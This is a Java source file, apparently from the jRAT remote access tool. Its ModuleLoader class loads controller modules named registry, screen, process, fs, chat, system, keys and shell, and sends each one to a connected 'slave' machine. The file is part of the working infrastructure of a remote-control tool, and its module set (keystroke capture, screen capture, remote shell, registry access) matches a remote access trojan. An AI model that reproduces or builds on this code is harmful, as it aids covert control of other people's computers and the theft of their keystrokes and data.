package jrat.controller.modules;

import jrat.common.Logger;
import jrat.controller.AbstractSlave;

import java.util.ArrayList;
import java.util.List;

public class ModuleLoader {

    private static final String[] moduleNames = {
            "registry",
            "screen",
            "process",
            "fs",
            "chat",
            "system",
            "keys",
            "shell"
    };

    private static final List<Module> modules = new ArrayList<>();

    static {
        for (String name : moduleNames) {
            modules.add(new Module(name));
        }
    }

    /**
     * Load all server side modules
     */
    public static void loadAll() {
        Logger.log("Loading " + modules.size() + " modules...");

        for (Module mod : modules) {
            try {
                mod.load();

                Logger.log("\t" + mod);
            } catch (Exception ex) {
                Logger.log("\t" + mod + " failed");
                ex.printStackTrace();
            }
        }
    }

    /**
     * Send all client side modules to the client
     * @param slave
     * @throws Exception
     */
    public static void sendAll(AbstractSlave slave) throws Exception {
        Logger.log("Writing " + modules.size() + " modules...");
        slave.writeInt(modules.size());

        for (Module mod : modules) {
            mod.write(slave);
        }
    }
}
